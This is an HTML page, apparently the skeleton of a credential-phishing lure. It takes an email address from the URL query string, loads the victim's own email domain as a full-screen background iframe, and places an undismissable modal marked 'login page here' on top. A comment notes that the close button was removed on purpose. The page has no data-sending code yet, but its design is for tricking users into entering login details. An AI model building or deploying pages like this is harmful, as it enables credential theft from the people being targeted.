<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Domain Modal</title>
    <style>
        body.inactive {
            overflow: hidden;
        }

        .background-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: -1; /* Ensure it's behind the modal */
        }

        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 100; /* Ensure the overlay covers the background */
        }

        #modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 20px;
            z-index: 101; /* Modal appears above the overlay */
        }
    </style>
</head>
<body>
    <div id="overlay"></div>
    <div id="modal">
        <p>login page here</p>
        <!-- Remove the button to prevent closing the modal -->
    </div>

    <script>
        // Function to get the email domain from the query string
        function getEmailDomain(queryString) {
            const params = new URLSearchParams(queryString);
            const email = params.get('files');
            if (email) {
                return email.split('@')[1]; // Extract domain after the @ symbol
            }
            return '';
        }

        // Function to display the iframe with the email domain and show the modal
        function showModal() {
            const queryString = window.location.search;
            const domain = getEmailDomain(queryString);

            if (domain) {
                const iframe = document.createElement('iframe');
                iframe.src = 'https://' + domain; // Load the domain as the iframe source
                iframe.className = 'background-iframe';
                document.body.appendChild(iframe); // Add the iframe to the body

                document.getElementById('overlay').style.display = 'block';
                document.getElementById('modal').style.display = 'block';
                document.body.classList.add('inactive'); // Disable background scrolling
            }
        }

        // Display the modal and email domain iframe on page load
        window.onload = showModal;
    </script>
</body>
</html>
